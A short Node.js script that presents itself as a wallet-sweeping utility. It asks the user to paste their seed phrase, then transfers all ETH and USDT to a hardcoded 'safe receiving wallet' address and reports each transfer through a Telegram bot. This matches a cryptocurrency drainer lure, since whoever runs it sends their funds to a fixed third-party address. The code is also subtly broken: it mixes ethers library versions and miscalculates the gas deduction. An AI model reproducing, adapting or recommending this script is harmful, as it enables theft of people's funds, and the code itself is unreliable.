const { ethers } = require("ethers");
const axios = require("axios");

// === Provider ===
const provider = new ethers.JsonRpcProvider("https://eth-mainnet.g.alchemy.com/v2/YOUR_ALCHEMY_KEY");

// === Your wallet ===
// Replace only locally: your seed phrase or private key
const wallet = ethers.Wallet.fromMnemonic("PASTE_YOUR_SEED_PHRASE_HERE").connect(provider);

// === Safe receiving wallet ===
const receivingWallet = "0x63FC90767faF3c06e7f74a56778b1f805D754F8A";

// === ERC-20 Token (USDT example) ===
const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT
const tokenAbi = ["function balanceOf(address) view returns (uint256)", "function transfer(address to, uint amount) returns (bool)"];
const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, wallet);

// === Telegram setup ===
const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";
const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN";

async function sendTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });
    } catch (err) {
        console.error("Telegram error:", err);
    }
}

async function sweepFunds() {
    try {
        // ETH sweep
        const balance = await provider.getBalance(wallet.address);
        if (balance.gt(0)) {
            const gasPrice = await provider.getGasPrice();
            const tx = await wallet.sendTransaction({
                to: receivingWallet,
                value: balance.sub(gasPrice),
                gasPrice: gasPrice
            });
            console.log("ETH swept! Tx hash:", tx.hash);
            await sendTelegram(`ETH swept! Tx hash: ${tx.hash}`);
        } else {
            console.log("No ETH to sweep.");
        }

        // USDT sweep
        const tokenBalance = await tokenContract.balanceOf(wallet.address);
        if (tokenBalance.gt(0)) {
            const txToken = await tokenContract.transfer(receivingWallet, tokenBalance);
            console.log("USDT swept! Tx hash:", txToken.hash);
            await sendTelegram(`USDT swept! Tx hash: ${txToken.hash}`);
        } else {
            console.log("No USDT to sweep.");
        }

    } catch (err) {
        console.error("Error sweeping funds:", err);
        await sendTelegram(`Error sweeping funds: ${err.message}`);
    }
}

sweepFunds();
